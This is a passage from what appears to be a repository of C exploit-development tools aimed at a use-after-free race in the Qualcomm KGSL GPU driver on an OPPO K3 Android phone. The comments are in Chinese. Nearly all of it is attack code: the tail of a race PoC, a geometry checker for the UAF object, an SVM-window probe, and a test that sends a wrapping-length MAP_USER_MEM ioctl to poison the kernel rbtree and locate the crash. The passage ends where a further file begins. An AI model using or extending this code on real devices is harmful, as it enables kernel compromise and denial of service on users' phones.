	/* BOGUS VMA */
	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;
	lg("BOGUS VMA OK");

	/* PLACEHOLDER */
	memset(&al, 0, sizeof(al));
	al.size = PLACEH_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("PLACEHOLDER alloc FAIL errno=%d", errno);
		return 1;
	}
	ph_id = al.id;
	ph_ms = al.mmapsize;
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)ph)[0] = 1;
	lg("PLACEHOLDER OK");

	/* racer（顺序执行：等它返回后再 map，复现 delay=3000µs 的安全时序） */
	memset(&rs, 0, sizeof(rs));
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return 1;
	}
	rs.ready = 1;
	pthread_join(th, NULL);
	lg("racer 返回 ret=%ld errno=%d (BOGUS 节点应已插入, 树已重平衡)",
	   rs.result, rs.saved_errno);
	sync_log();

	/* 主线程 OVERLAP mmap */
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	e = errno;
	lg("OVERLAP mmap → %s errno=%d (%s)",
	   p == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
	sync_log();

	/* 判别探针 */
	{
		int e1 = 0, e2 = 0;
		int r1 = svm_probe(PROBE_OVERLAP_ONLY, "probe(OVERLAP∩¬UAF)", &e1);
		int r2 = svm_probe(PROBE_INSIDE_UAF, "probe(inside UAF)", &e2);
		(void)r2;
		lg("---- 判定 ----");
		if (r1 == 0)
			lg("verdict: OVERLAP 节点不存在 → 主线程在 set_svm_region 就失败 → 未命中 (情况 a)");
		else if (e1 == ENOMEM)
			lg("verdict: OVERLAP 节点存在 → 主线程已进入 kgsl_mmu_map/map_sg → 漏洞路径已触及 (情况 b)");
		else
			lg("verdict: 意外值 ret=%d errno=%d (情况 c)", r1, e1);
		lg("control(inside UAF): ret=%d errno=%d （预期 -1/ENOMEM）", r2,
		   e2);
	}
	sync_log();
	lg("===== end =====");
	sync_log();
	close(fd);
	return 0;
}
```

`tools/k3_geom_full.c`:

```c
/*
 * k3_geom_full.c — 满尺寸四段 range 几何复核（PoC 步骤 [1]–[7]，不含竞态）
 *
 * 目的：确认 256 MB 的 UAF 对象（[0x7001ff000, 0x800203000)，跨越 SVM64 上界
 *       0x800000000）在本机仍可 alloc + mmap(FIXED) 成功。
 * 不含：MAP_USER_MEM(BOGUS)/竞速/GPU 命令提交 —— 全部为无害的分配与映射。
 *
 * 预期（与 PoC 未竞速基线一致）：
 *   - UAF / PLACEHOLDER mmap 成功
 *   - OVERLAP mmap 失败 ENOMEM(12)：UAF 的 rbtree 条目仍占位
 *   - 竞速成功后该失败码应变为 ENODEV(19)，届时才进入下一阶段
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

struct kgsl_gpuobj_info {
	uint64_t gpuaddr;
	uint64_t flags;
	uint64_t size;
	uint64_t va_len;
	uint64_t va_addr;
	unsigned int id;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO \
	_IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL

static int fd = -1;

static void meminfo(const char *tag)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[128];
	int shown = 0;
	printf("  [%s] ", tag);
	if (!f) {
		printf("(meminfo 不可读)\n");
		return;
	}
	while (fgets(line, sizeof(line), f) && shown < 3) {
		if (!strncmp(line, "MemFree:", 8) ||
		    !strncmp(line, "MemAvailable:", 13) ||
		    !strncmp(line, "SwapFree:", 9)) {
			line[strcspn(line, "\n")] = 0;
			printf("%s | ", line);
			shown++;
		}
	}
	fclose(f);
	printf("\n");
	fflush(stdout);
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;
	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		printf("  ALLOC(0x%llx) FAIL errno=%d (%s)\n",
		       (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	printf("  ALLOC(0x%llx) OK id=%u mmapsize=0x%llx\n",
	       (unsigned long long)size, al.id, (unsigned long long)al.mmapsize);
	fflush(stdout);
	return 0;
}

static void *obj_mmap(unsigned int id, uint64_t ms, uint64_t at, const char *tag)
{
	void *p = mmap((void *)(uintptr_t)at, (size_t)ms, PROT_READ | PROT_WRITE,
		       MAP_SHARED | MAP_FIXED, fd, (off_t)id << 12);
	int e = errno;
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != at) {
		printf("  mmap(%s @0x%llx len=0x%llx) FAIL errno=%d (%s)\n", tag,
		       (unsigned long long)at, (unsigned long long)ms, e,
		       strerror(e));
		fflush(stdout);
		return MAP_FAILED;
	}
	printf("  mmap(%s @0x%llx len=0x%llx) OK\n", tag,
	       (unsigned long long)at, (unsigned long long)ms);
	fflush(stdout);
	return p;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p;
	size_t i;

	printf("k3_geom_full | pid=%d uid=%d\n", getpid(), getuid());
	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		printf("open FAIL errno=%d\n", errno);
		return 1;
	}
	meminfo("before");

	printf("\n[1] UAF alloc 0x%llx\n", (unsigned long long)UAF_SIZE);
	if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
		return 1;

	printf("\n[2] OVERLAP alloc 0x%llx（先不 mmap）\n",
	       (unsigned long long)OVERLAP_SIZE);
	if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
		return 1;

	printf("\n[3] UAF mmap FIXED\n");
	p = obj_mmap(uaf_id, uaf_ms, UAF_START, "UAF");
	if (p == MAP_FAILED)
		return 1;

	/* 抽样触碰：每 1024 页一次，首末页必触 */
	((volatile char *)p)[0] = 0x5a;
	((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
	for (i = 0; i + PAGE < uaf_ms; i += PAGE * 1024)
		((volatile char *)p)[i] = 0x5a;
	printf("  touch 抽样完成（含首末页）\n");
	meminfo("after UAF touch");

	printf("\n[4] UAF munmap（PTE 与 rbtree 条目预期残留）\n");
	munmap(p, (size_t)uaf_ms);

	printf("\n[5] BOGUS 匿名 VMA（3 页，不调用 MAP_USER_MEM）\n");
	p = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED)
		printf("  BOGUS VMA FAIL errno=%d (%s)\n", errno, strerror(errno));
	else {
		printf("  BOGUS VMA OK @0x%llx\n",
		       (unsigned long long)BOGUS_START);
		((volatile char *)p)[0] = 1;
		((volatile char *)p)[PAGE] = 1;
		((volatile char *)p)[PAGE * 2] = 1;
	}

	printf("\n[6] PLACEHOLDER alloc + mmap FIXED\n");
	if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
		p = obj_mmap(ph_id, ph_ms, PLACEH_START, "PLACEHOLDER");
		if (p != MAP_FAILED) {
			((volatile char *)p)[0] = 1;
			munmap(p, (size_t)ph_ms);
		}
	}

	printf("\n[7] OVERLAP mmap FIXED（未竞速基线，预期 ENOMEM=12）\n");
	p = obj_mmap(ov_id, ov_ms, OVERLAP_START, "OVERLAP");
	if (p != MAP_FAILED)
		munmap(p, (size_t)ov_ms);

	printf("\n[8] 清理\n");
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		if (ph_id) {
			fr.id = ph_id;
			ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		}
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	munmap((void *)(uintptr_t)BOGUS_START, PAGE * 3);
	close(fd);
	meminfo("after cleanup");
	printf("\ndone\n");
	return 0;
}
```

`tools/k3_kgsl_probe.c`:

```c
/*
 * k3_kgsl_probe.c — OPPO K3 (PCGM00 / SDM710 / 4.9.227) KGSL 阶段 A 探针
 *
 * 目的（对应交接文档 §14.5 阶段 A / §14.4 range 标定）：
 *   A. UAPI 往返：GETPROPERTY / DRAWCTXT_CREATE / GPUOBJ_ALLOC / GPUOBJ_INFO /
 *      GPUOBJ_FREE 的编号与结构体逐字段是否被内核正确解释。
 *   B. SVM 窗口标定：MAP_USER_MEM(ADDR, USE_CPU_MAP) 在不同 user VA 上的接受性，
 *      用于界定 kgsl_mmu_set_svm_region 的 [svm_start, svm_end)。
 *
 * 全部为只读/无害操作：不触碰竞态、不做 UAF、不改内核状态。
 * 结构体定义来源：src_ref/kgsl_4.9/msm_kgsl.h（4.9 UAPI）。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_device_getproperty {
	unsigned int type;
	void *value;
	uint64_t sizebytes;
};

struct kgsl_version {
	unsigned int drv_major;
	unsigned int drv_minor;
	unsigned int dev_major;
	unsigned int dev_minor;
};

struct kgsl_devinfo {
	unsigned int device_id;
	unsigned int chip_id;
	unsigned int mmu_enabled;
	unsigned long gmem_gpubaseaddr;
	unsigned int gpu_id;
	uint64_t gmem_sizebytes;
};

struct kgsl_drawctxt_create {
	unsigned int flags;
	unsigned int drawctxt_id;
};

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

struct kgsl_gpuobj_info {
	uint64_t gpuaddr;
	uint64_t flags;
	uint64_t size;
	uint64_t va_len;
	uint64_t va_addr;
	unsigned int id;
};

#define IOCTL_KGSL_DEVICE_GETPROPERTY \
	_IOWR(KGSL_IOC_TYPE, 0x2, struct kgsl_device_getproperty)
#define IOCTL_KGSL_DRAWCTXT_CREATE \
	_IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO \
	_IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

#define KGSL_PROP_DEVICE_INFO 0x1
#define KGSL_PROP_MMU_ENABLE  0x6
#define KGSL_PROP_VERSION     0x8

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002

static void hdr(const char *s)
{
	printf("\n== %s ==\n", s);
	fflush(stdout);
}

static void ioctl_report(const char *tag, int ret, int err)
{
	if (ret == 0)
		printf("%-28s OK\n", tag);
	else
		printf("%-28s FAIL ret=%d errno=%d (%s)\n", tag, ret, err,
		       strerror(err));
	fflush(stdout);
}

int main(void)
{
	int fd, ret, err;

	printf("k3_kgsl_probe | pid=%d uid=%d euid=%d\n", getpid(), getuid(),
	       geteuid());
	printf("sizes: getproperty=%zu drawctxt=%zu map_user_mem=%zu "
	       "gpuobj_alloc=%zu gpuobj_free=%zu gpuobj_info=%zu\n",
	       sizeof(struct kgsl_device_getproperty),
	       sizeof(struct kgsl_drawctxt_create),
	       sizeof(struct kgsl_map_user_mem),
	       sizeof(struct kgsl_gpuobj_alloc),
	       sizeof(struct kgsl_gpuobj_free),
	       sizeof(struct kgsl_gpuobj_info));

	hdr("A0 open /dev/kgsl-3d0");
	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		printf("open FAIL errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}
	printf("open OK fd=%d\n", fd);

	hdr("A1 GETPROPERTY");
	{
		struct kgsl_device_getproperty gp;
		struct kgsl_version ver;
		struct kgsl_devinfo di;
		int mmu = -1;

		memset(&ver, 0, sizeof(ver));
		gp.type = KGSL_PROP_VERSION;
		gp.value = &ver;
		gp.sizebytes = sizeof(ver);
		errno = 0;
		ret = ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &gp);
		err = errno;
		ioctl_report("GETPROPERTY(VERSION)", ret, err);
		if (ret == 0)
			printf("  version drv=%u.%u dev=%u.%u\n",
			       ver.drv_major, ver.drv_minor, ver.dev_major,
			       ver.dev_minor);

		memset(&di, 0, sizeof(di));
		gp.type = KGSL_PROP_DEVICE_INFO;
		gp.value = &di;
		gp.sizebytes = sizeof(di);
		errno = 0;
		ret = ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &gp);
		err = errno;
		ioctl_report("GETPROPERTY(DEVICE_INFO)", ret, err);
		if (ret == 0)
			printf("  devinfo device_id=0x%x chip_id=0x%x gpu_id=0x%x "
			       "mmu_enabled=%u gmem_base=0x%lx gmem_size=0x%llx\n",
			       di.device_id, di.chip_id, di.gpu_id,
			       di.mmu_enabled, di.gmem_gpubaseaddr,
			       (unsigned long long)di.gmem_sizebytes);

		gp.type = KGSL_PROP_MMU_ENABLE;
		gp.value = &mmu;
		gp.sizebytes = sizeof(mmu);
		errno = 0;
		ret = ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &gp);
		err = errno;
		ioctl_report("GETPROPERTY(MMU_ENABLE)", ret, err);
		if (ret == 0)
			printf("  mmu_enabled=%d\n", mmu);
	}

	hdr("A2 DRAWCTXT_CREATE");
	{
		unsigned int flag_sets[3] = {0, KGSL_CONTEXT_NO_GMEM_ALLOC,
					     KGSL_CONTEXT_NO_GMEM_ALLOC};
		int i;

		for (i = 0; i < 1; i++) {
			struct kgsl_drawctxt_create dc;
			dc.flags = flag_sets[i];
			dc.drawctxt_id = 0;
			errno = 0;
			ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc);
			err = errno;
			ioctl_report("DRAWCTXT_CREATE(flags=0)", ret, err);
			if (ret == 0)
				printf("  drawctxt_id=%u\n", dc.drawctxt_id);
		}
	}

	hdr("A3 GPUOBJ_ALLOC / INFO / mmap / FREE");
	{
		struct kgsl_gpuobj_alloc al;
		struct kgsl_gpuobj_info inf;
		struct kgsl_gpuobj_free fr;
		unsigned int obj_id = 0;
		uint64_t mmapsize = 0, va_addr = 0;

		memset(&al, 0, sizeof(al));
		al.size = 0x1000;
		al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
		al.va_len = 0;
		errno = 0;
		ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al);
		err = errno;
		ioctl_report("GPUOBJ_ALLOC(0x1000)", ret, err);
		if (ret == 0) {
			obj_id = al.id;
			mmapsize = al.mmapsize;
			printf("  id=%u mmapsize=0x%llx\n", al.id,
			       (unsigned long long)al.mmapsize);
		}

		if (ret == 0) {
			memset(&inf, 0, sizeof(inf));
			inf.id = obj_id;
			errno = 0;
			ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
			err = errno;
			ioctl_report("GPUOBJ_INFO", ret, err);
			if (ret == 0) {
				va_addr = inf.va_addr;
				printf("  gpuaddr=0x%llx flags=0x%llx "
				       "size=0x%llx va_len=0x%llx "
				       "va_addr=0x%llx\n",
				       (unsigned long long)inf.gpuaddr,
				       (unsigned long long)inf.flags,
				       (unsigned long long)inf.size,
				       (unsigned long long)inf.va_len,
				       (unsigned long long)inf.va_addr);
				printf("  size_consistent=%s\n",
				       inf.size == 0x1000 ? "yes" : "no");
			}
		}

		if (ret == 0 && mmapsize) {
			void *p = mmap(NULL, (size_t)mmapsize,
				       PROT_READ | PROT_WRITE, MAP_SHARED, fd,
				       (off_t)obj_id << 12);
			if (p == MAP_FAILED) {
				printf("%-28s FAIL errno=%d (%s)\n",
				       "mmap(gpuobj, offset=id<<12)", errno,
				       strerror(errno));
			} else {
				volatile uint64_t *q = (volatile uint64_t *)p;
				printf("%-28s OK addr=%p\n", "mmap(gpuobj)", p);
				q[0] = 0x1122334455667788ULL;
				q[1] = 0x99aabbccddeeff00ULL;
				printf("  rw_test first=0x%llx second=0x%llx "
				       "-> %s\n",
				       (unsigned long long)q[0],
				       (unsigned long long)q[1],
				       (q[0] == 0x1122334455667788ULL &&
					q[1] == 0x99aabbccddeeff00ULL) ?
					       "PASS" : "MISMATCH");
				munmap(p, (size_t)mmapsize);
			}
		}

		if (obj_id) {
			memset(&fr, 0, sizeof(fr));
			fr.id = obj_id;
			errno = 0;
			ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
			err = errno;
			ioctl_report("GPUOBJ_FREE", ret, err);
		}
	}

	hdr("B  SVM window probe (MAP_USER_MEM + USE_CPU_MAP)");
	{
		uint64_t probes[] = {
			0x0000001000000000ULL, /* 64 GiB */
			0x0000000100000000ULL, /*  4 GiB */
			0x0000000080000000ULL, /*  2 GiB */
			0x0000000040000000ULL, /*  1 GiB */
			0x0000000c00000000ULL, /* 48 GiB */
			0x0000007000000000ULL, /* 448 GiB */
			0x0000007001fe000ULL,  /* RCA OVERLAP */
			0x0000007001ff000ULL,  /* RCA UAF */
			0x000000700204000ULL,  /* RCA BOGUS */
			0x000000710204000ULL,  /* RCA PLACEHOLDER */
			0x000000ff00000000ULL,
			0x00007f0000000000ULL,
		};
		unsigned int i;
		int ok_cnt = 0;

		printf("%-20s %-10s %-14s %s\n", "hostptr", "len", "result",
		       "gpuaddr_out");
		for (i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
			struct kgsl_map_user_mem m;
			void *p;

			p = mmap((void *)(uintptr_t)probes[i], 0x1000,
				 PROT_READ | PROT_WRITE,
				 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
			if (p == MAP_FAILED) {
				printf("0x%014llx   0x1000     mmap_fail(%d) %s\n",
				       (unsigned long long)probes[i], errno,
				       strerror(errno));
				continue;
			}
			((volatile char *)p)[0] = 0x5a;

			memset(&m, 0, sizeof(m));
			m.fd = -1;
			m.gpuaddr = 0;
			m.len = 0x1000;
			m.offset = 0;
			m.hostptr = (unsigned long)(uintptr_t)p;
			m.memtype = KGSL_USER_MEM_TYPE_ADDR;
			m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
			errno = 0;
			ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
			err = errno;
			if (ret == 0) {
				ok_cnt++;
				printf("0x%014llx   0x1000     OK             "
				       "gpuaddr=0x%lx flags_out=0x%x\n",
				       (unsigned long long)probes[i], m.gpuaddr,
				       m.flags);
			} else {
				printf("0x%014llx   0x1000     FAIL           "
				       "errno=%d (%s)\n",
				       (unsigned long long)probes[i], err,
				       strerror(err));
			}
			/* 撤销 VMA；成功注册的区间会在进程退出时回收 */
			munmap(p, 0x1000);
		}
		printf("svm_probe_accepted=%d/%zu\n", ok_cnt,
		       sizeof(probes) / sizeof(probes[0]));
	}

	hdr("B2 non-CPU_MAP allocation gpuaddr (find_svm path)");
	{
		struct kgsl_map_user_mem m;
		void *p = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		if (p != MAP_FAILED) {
			memset(&m, 0, sizeof(m));
			m.fd = -1;
			m.len = 0x4000;
			m.hostptr = (unsigned long)(uintptr_t)p;
			m.memtype = KGSL_USER_MEM_TYPE_ADDR;
			m.flags = 0;
			errno = 0;
			ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
			err = errno;
			ioctl_report("MAP_USER_MEM(no cpu_map)", ret, err);
			if (ret == 0)
				printf("  hostptr=%p gpuaddr=0x%lx\n", p,
				       m.gpuaddr);
			munmap(p, 0x4000);
		}
	}

	close(fd);
	printf("\ndone\n");
	return 0;
}
```

`tools/k3_poison_test.c`:

```c
/*
 * k3_poison_test.c — 定位崩溃点：单独执行 racer 的 MAP_USER_MEM（不做竞速）
 *
 * 目的：区分三种可能
 *   H1  该 ioctl 自身立即致命            → 日志停在 "racer: 进入"，无返回行
 *   H2  该 ioctl 返回 ENOMEM 并毒化 rbtree，
 *       后续任何 set_svm_region 触发崩溃   → 日志停在 "probe-after: 进入"
 *   H3  毒化无害，崩溃在进程退出/pagetable 销毁 → 日志能打完 "about to exit"
 *
 * 每步 write(2)+fsync 落到 /data/local/tmp/poison.log（重启后仍可读）。
 * 不含竞速、不含 GPU 命令。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/poison.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL
#define CTRL_ADDR     0x00000007f0000000ULL  /* 干净区间，位于 UAF 区间之上 */
#define AFTER_ADDR    0x00000007e0000000ULL  /* 毒化后探测 */

static int fd = -1;
static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300];
	char line[360];
	va_list ap;
	int n;
	double t = now_ms();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.3f] %s\n", t, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0) {
		if (write(logfd, line, n) < 0) { }
		fsync(logfd);
	}
}

static void on_alarm(int s)
{
	(void)s;
	lg("WATCHDOG: 45s 超时（阻塞在 ioctl？）");
	_exit(9);
}

/* 在 addr 建一个页 VMA 并注册为 SVM 区（干净探测） */
static int svm_probe(uint64_t addr, const char *tag)
{
	struct kgsl_map_user_mem m;
	void *p;
	int ret, e;

	p = mmap((void *)(uintptr_t)addr, PAGE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED) {
		lg("%s: vma FAIL errno=%d (%s)", tag, errno, strerror(errno));
		return -1;
	}
	*(volatile char *)p = 1;
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = PAGE;
	m.hostptr = (unsigned long)(uintptr_t)p;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	lg("%s: 进入 MAP_USER_MEM(0x%llx)", tag, (unsigned long long)addr);
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("%s: 返回 ret=%d errno=%d (%s) gpuaddr=0x%lx", tag, ret, e,
	   strerror(e), m.gpuaddr);
	munmap(p, PAGE);
	return ret;
}

int main(void)
{
	unsigned int uaf_id = 0;
	uint64_t uaf_ms = 0;
	void *p, *bogus;
	size_t k;
	struct kgsl_map_user_mem m;
	int ret, e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== poison_test start pid=%d =====", getpid());
	signal(SIGALRM, on_alarm);
	alarm(45);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("open OK fd=%d", fd);

	/* 对照组：毒化之前，干净区间应可注册 */
	svm_probe(CTRL_ADDR, "control-before");

	/* UAF 几何 */
	memset(&m, 0, sizeof(m));
	{
		struct kgsl_gpuobj_alloc al;
		memset(&al, 0, sizeof(al));
		al.size = UAF_SIZE;
		al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
		errno = 0;
		if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
			lg("UAF alloc FAIL errno=%d", errno);
			return 1;
		}
		uaf_id = al.id;
		uaf_ms = al.mmapsize;
		lg("UAF alloc OK id=%u mmapsize=0x%llx", uaf_id,
		   (unsigned long long)uaf_ms);
	}
	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	lg("UAF mmap+touch OK");
	munmap(p, (size_t)uaf_ms);
	lg("UAF munmap OK");

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;
	lg("BOGUS VMA OK");

	/* —— 关键：单独执行 racer 的 ioctl —— */
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = WRAP_SIZE;
	m.offset = 0;
	m.hostptr = BOGUS_START;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	lg("racer: 进入 MAP_USER_MEM(hostptr=0x%llx, len=0x%llx)",
	   (unsigned long long)BOGUS_START, (unsigned long long)WRAP_SIZE);
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("racer: 返回 ret=%d errno=%d (%s)", ret, e, strerror(e));

	/* 毒化后探测：这棵树是否还能行走 */
	svm_probe(AFTER_ADDR, "probe-after");

	lg("about to exit（若此后设备离线，则崩溃在退出/pagetable 销毁）");
	lg("===== end =====");
	close(fd);
	_exit(0);
}
```

`tools/k3_race_scan.c`:

```c
/*
